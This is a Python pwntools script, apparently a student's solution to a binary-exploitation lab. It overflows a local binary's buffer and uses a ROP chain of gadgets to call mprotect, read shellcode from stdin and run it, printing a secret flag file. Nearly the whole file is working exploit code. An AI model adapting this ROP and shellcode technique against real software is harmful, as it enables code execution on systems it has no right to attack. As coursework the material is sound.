# My own code
import os
from pwn import *

context.arch = "amd64"

file_secret = "10100_ILIN_Mykola.secret"
file_binary = "10100_ILIN_Mykola"

# GADGETS
pop_rax = p64(0x449857)  # pop rax; ret
pop_rdi = p64(0x40191a)  # pop rdi; ret
pop_rsi = p64(0x40f55e)  # pop rsi; ret
pop_rdx = p64(0x40181f)  # pop rdx; ret
add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret
syscall = p64(0x485ac9)  # syscall; ret
nop = p64(0x401d1f)


def run_exploit(debug):
    p = process(file_binary)
    if debug == True:
        pid = util.proc.pidof(p)[0]
        cmd = f"cmd.exe /c start wt -p 'PowerShell' -d . wsl -e bash -c 'gdb -p {pid}\; exec $BASH'"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


def padding():
    buf = b""
    buf += b"A" * 336
    buf += p32(1337)
    buf = buf.ljust(1672, b"B")
    return buf


def set_rax(value):
    buf = b""
    buf += pop_rax
    buf += p64(value)
    return buf

def set_rdi(value):
    buf = b""
    buf += pop_rdi
    buf += p64(value)
    return buf

def set_rsi(value):
    buf = b""
    buf += pop_rsi
    buf += p64(value)
    return buf


def set_rdx(value):
    buf = b""
    buf += pop_rdx
    buf += p64(value)
    return buf


def sys_mprotect(address, length, protection):
    num_mprotect = 10
    buf = b""

    # rax = 10
    buf += pop_rax
    buf += p64(5)
    buf += pop_rdi
    buf += p64(5)
    buf += add_rax_rdi

    # buf += set_rax(num_mprotect)

    buf += set_rdi(address)
    buf += set_rsi(length)
    buf += set_rdx(protection)

    buf += syscall
    return buf


def sys_read(fd, address, length):
    num_read = 0
    buf = b""

    buf += set_rdi(fd)
    buf += set_rsi(address)
    buf += set_rdx(length)

    buf += set_rax(num_read)
    buf += syscall
    return buf


def main():
    p = run_exploit(True)
    sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))

    # Overflow
    buf = b""
    buf += padding()

    # mprotect()
    rwx_addr = 0x400000
    mem_page = 0x1000  # 1 RAM page = 4 KiB = 4096 bytes = 0x1000
    rwx_mode = 7  # RWX = read | write | execute = 7
    buf += sys_mprotect(rwx_addr, mem_page, rwx_mode)

    # read()
    stdin_fd = 0
    buf += sys_read(stdin_fd, rwx_addr, len(sc))

    # Jump to buf
    buf += p64(rwx_addr)

    log.info("=== buffer")
    print(hexdump(buf))
    p.readline()
    p.writeline(buf)
    p.readuntil(b"GRANTED!")

    # pause()
    log.info("=== shellcode")
    print(hexdump(sc))
    p.writeline(sc)

    log.success(f"FLAG {p.readall().strip().decode()}")


if __name__ == "__main__":
    main()
